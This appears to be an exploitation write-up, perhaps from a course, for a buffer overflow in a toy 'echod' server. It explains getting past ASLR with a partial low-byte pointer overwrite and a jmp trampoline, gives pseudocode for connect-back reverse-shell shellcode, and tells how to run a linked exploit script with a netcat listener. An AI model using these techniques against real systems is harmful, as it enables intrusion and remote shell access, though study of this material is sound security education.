    <h3> Intro</h3>
    <p>My goal with <tt>echod</tt> was to write an exploit that could
    reliably get a shell quickly -- in, say, a few hundred tries at
    most. Therefore, I looked for methods to avoid having to
    brute-force the location of the stack, which is the thing ASLR is
    best at hiding. The only data I control is the
    200-byte <tt>buff</tt> on the stack, so unless I can write an
    exploit using only information from libc (on further reflection,
    this may be entirely possible), I need a way to figure out where
    the stack lives.</p>

    <h3> The plan</h3>
    <p>One standard trick for getting around stack randomization is
    the chain of rets trick explained in my talk. The problem is, the
    only pointer onto the stack within our 200-byte exploit window is
    the “addr” pointer, which points <b>deeper</b> into the stack, at
    a structure we have limited control over (we (somewhat) control
    the <tt>sin_addr</tt> field of the <tt>sockaddr_in</tt>). However,
    it turns out that we can abuse this pointer in a clever way. The
    fact that the overflow uses <tt>read</tt> directly, instead of
    something that writes a terminator byte (e.g. <tt>strcpy</tt>)
    means we have very precise control over what we're writing. In
    particular, we have the ability to <b>only</b> overwite the low
    byte of the <tt>addr</tt> pointer.</p>

    <p>
      If we look at the stack diagram to the left (produced from some
      careful work in gdb), we note that <tt>buff</tt> begins 156
      bytes below <tt>claddr</tt>. This means that if we get lucky,
      and the final byte of <tt>addr</tt> is <tt>0x9c</tt> or
      greater, <tt>addr</tt> and <tt>&amp;buff</tt> will differ only
      in the LSByte, and we can generate a pointer to <tt>buff</tt> by
      overwriting the bottom byte of <tt>addr</tt>. Moreover, we know
      that values on the stack are word-aligned, so there are very few
      possibilities for that low byte. In fact, it turns out that the
      stack is not only word-aligned, but 16-byte-aligned
      <a name="text1" /><a href="#note1"><sup>1</sup></a>, which means
      that the low nibble is always the same across all runs
      of <tt>echod</tt> If a search of the LSB fails, we can search
      the 2<sup>nd</sup> LSB, which still gives us only about 256*16 =
      4096 possibilities. We could conceivably still get lucky,
      if <tt>addr</tt> points to, e.g. <tt>0xbf880032</tt>, but this
      is extremely unlikely, so we'll ignore that possibility for now.
    </p>

    <h3>One last trick</h3>

    <p>
      But it turns out we can boost our odds even a little bit
      further. Instead of targetting the beginning of <tt>buff</tt>,
      we can put a <tt>jmp -98</tt> at the start of the <b>last</b>
      word in <tt>buff</tt>, and aim for that. With a difference
      of <tt>0x3c</tt> between <tt>claddr</tt> and that value, we now
      have a 3/4 chance of not having to explore the 2<sup>nd</sup>
      LSB at all. And even if we do have to, we then know the LSB must
      be greater than <tt>0xC4</tt>, or else the first pass would have
      found it. And the LSnibble still must be <tt>0xC</tt>, so our
      extended search space is roughly 12 + 256*4 = 1036, which is
      easily searchable in a few seconds. And in most cases, we'll get
      it in one of those first 12.
    </p>
    <p>
      We could even stick the <tt>jmp</tt>, and our target, as far
      forward as <tt>%ebp</tt>, but I didn't bother, and it doesn't
      really matter.
      </p>

    <h3>The shellcode</h3>

    <p>As mentioned, I was writing an exploit for a shell, so my
    shellcode is a standard connect-back code that opens a socket to
    the attacker's machine, <tt>dup</tt>'s some fd's, and then
    execs <tt>/bin/sh</tt>. In essence, it does:
      <pre><code>
          fd = socket(PF_INET, SOCK_STREAM, 0);
          connect(fd, [addr], [port]);
          dup2(fd, 0);
          dup2(fd, 1);
          execve("/bin/sh", ["/bin/sh", NULL], NULL);
      </code></pre>
    </p>
    <p>The shellcode comes in at just under 100 bytes, and so barely
    fits in our buffer, leaving very little room for NOP
    padding. Fortunately, the above attack rapidly guesses an exact
    pointer to <tt>buff</tt>.</p>

    </ul>

    <h3>The code</h3>

    <p><a href="hackit-echod.pl">hackit-echod.pl</a> implements the
    above attack. Before running it, you must set up something,
    e.g. netcat, listening for incoming connections on port
    4444. Usage is <tt>perl hackit-echod.pl my-ip
    target-hostname</tt>.</p>

    <hr />
    <div id="footnote">
      <a name="note1" /><a href="#text1"><sup>1</sup></a> If we look
      at <tt>echod</tt>, we see that gcc has generated code that does
      <pre><code>and $0xfffffff0,%esp</code></pre> at the start
      of <tt>main()</tt>, assuring that the stack is 16-byte
      aligned. This presumably helps performance, but makes this
      exploit even easier.
